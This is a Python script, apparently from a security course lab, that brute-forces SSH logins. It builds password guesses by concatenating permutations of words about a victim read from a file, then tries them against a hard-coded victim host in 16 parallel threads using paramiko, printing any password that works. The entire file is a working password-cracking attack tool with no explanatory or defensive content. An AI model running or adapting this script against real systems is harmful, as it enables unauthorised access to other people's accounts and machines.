#!/usr/bin/python3
import itertools, paramiko, sys
import threading

def try_ssh(victim_ip, attacker_ip, attacker_port, pswd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f'Trying password: {pswd}')
        client.connect(victim_ip, username='csc2024', password=pswd,\
                        banner_timeout=10, auth_timeout=10)
    except paramiko.ssh_exception.AuthenticationException as e:
        # print(f'{e}')
        client.close()
        return False
    except paramiko.ssh_exception.SSHException as e:
        print(f'{e}')
        client.close()
        return False
    else:
        print(f'Password found: {pswd}')
        return True

def crack_ssh(victim_ip, attacker_ip, attacker_port, pswds):
    global vctm_pswd
    vctm_pswd = ""
    for p in pswds:
        if try_ssh(victim_ip, attacker_ip, attacker_port, p):
            print(f'Password found: {p}')
            vctm_pswd = p
        if vctm_pswd != "":
            break

def get_victim_data():
    dic = list()
    with open('victim.dat', 'r') as f:
        for line in f:
            if line.strip() not in dic:
                dic.append(line.strip())

    pwd_dic = []
    for i in range(1, len(dic)+1):
        for iter in itertools.permutations(dic, i):
            pwd = ""
            for word in iter:
                pwd += word
            pwd_dic.append(pwd)
            # if try_ssh('172.18.0.3', '172.18.0.2', '33333', pwd):
            #     pswd = pwd
            #     break
    return pwd_dic

if __name__ == '__main__':
    # if len(sys.argv) != 4:
    #     print(f'Usage: {sys.argv[0]} <victim_ip> <attacker_ip> <attacker_port>')
    #     sys.exit(1)
    # crack_ssh(sys.argv[1], sys.argv[2], sys.argv[3])
    pswds_dict = get_victim_data()
    t_num = 16
    print(type(pswds_dict[0:len(pswds_dict)//t_num]))
    threads = []
    for i in range(0, t_num):
        if i == t_num-1:
            threads.append(threading.Thread(target=crack_ssh,\
                args=('172.18.0.3', '172.18.0.2', '33333',\
                pswds_dict[i*len(pswds_dict)//t_num:len(pswds_dict)])))
        else:
            threads.append(threading.Thread(target=crack_ssh,\
                args=('172.18.0.3', '172.18.0.2', '33333',\
                pswds_dict[i*len(pswds_dict)//t_num:(i+1)*len(pswds_dict)//t_num])))
        threads[i].start()
